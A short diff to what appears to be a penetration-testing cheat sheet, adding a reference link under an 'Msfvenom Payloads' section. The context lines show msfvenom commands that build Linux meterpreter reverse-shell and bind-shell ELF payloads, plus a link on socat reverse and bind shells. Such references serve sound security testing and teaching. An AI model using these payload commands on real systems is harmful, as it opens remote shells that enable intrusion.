@@ -83,6 +83,7 @@ AWK
 [Reverse and Bind Shells with Socat](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)
 
 ## Msfvenom Payloads 
+[Reference](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/) 
 
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf	
     msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
